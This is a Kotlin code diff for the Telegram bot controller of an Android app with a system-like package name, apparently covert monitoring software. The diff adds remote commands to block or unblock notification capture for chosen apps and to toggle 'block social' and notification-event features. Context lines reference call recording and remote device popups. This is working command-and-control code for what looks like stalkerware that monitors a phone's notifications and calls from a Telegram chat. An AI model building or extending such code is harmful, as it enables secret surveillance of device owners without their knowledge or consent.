@@ -65,6 +65,18 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
         val text = message.text ?: return null
         val chatId = message.chat.id
         
+        if (message.reply_to_message != null) {
+            val replyText = message.reply_to_message.text ?: ""
+            if (replyText.contains("Reply with the Package Name to BLOCK")) {
+                BotActions.handleNotificationBlacklistAdd(context, text, chatId)
+                return "Processing block request..."
+            }
+            if (replyText.contains("Reply with the Package Name to UNBLOCK")) {
+                BotActions.handleNotificationBlacklistRemove(context, text, chatId)
+                return "Processing unblock request..."
+            }
+        }
+
         if (waitingForPopup[chatId] == true) {
             waitingForPopup.remove(chatId)
             BotActions.showDevicePopup(context, text)
@@ -182,6 +194,29 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
                     BotActions.toggleBasicUpdateFeature(context, query.data)
                 }
                 editMessage(query, BotMessages.Settings.buildBasicUpdatesPrompt(context), BotMarkups.Settings.buildBasicUpdatesMarkup(context))
+                null
+            }
+            "cfg_notif_events", "toggle_notif_events", "toggle_block_social" -> {
+                if (query.data != "cfg_notif_events") {
+                    BotActions.toggleBasicUpdateFeature(context, query.data)
+                }
+                editMessage(query, BotMessages.Settings.buildNotificationEventsFeaturePrompt(context), BotMarkups.Settings.buildNotificationEventsFeatureMarkup(context))
+                null
+            }
+            "notif_blacklist_menu", "superior_notif_events" -> {
+                editMessage(query, BotMessages.Settings.buildNotificationBlacklistPrompt(context), BotMarkups.Settings.buildNotificationBlacklistMarkup())
+                null
+            }
+            "notif_blacklist_add" -> {
+                val prefsToken = com.system.superiormonitor.data.PrefsManager.getInstance(context).botToken
+                TelegramApi.sendMessage(prefsToken, query.message?.chat?.id.toString(), "⚠️ Reply with the Package Name to BLOCK\n\nExample: com.android.chrome\n\nReply directly to this message with the exact package name.", parseMode = "Markdown", replyMarkup = BotMarkups.Settings.buildForceReplyMarkup())
+                TelegramApi.answerCallbackQuery(prefsToken, query.id, "Please reply to the new message.")
+                null
+            }
+            "notif_blacklist_remove" -> {
+                val prefsToken = com.system.superiormonitor.data.PrefsManager.getInstance(context).botToken
+                TelegramApi.sendMessage(prefsToken, query.message?.chat?.id.toString(), "⚠️ Reply with the Package Name to UNBLOCK\n\nReply directly to this message with the exact package name to remove it from the blacklist.", parseMode = "Markdown", replyMarkup = BotMarkups.Settings.buildForceReplyMarkup())
+                TelegramApi.answerCallbackQuery(prefsToken, query.id, "Please reply to the new message.")
                 null
             }
             "superior_call_rec_menu", "toggle_call_rec" -> {
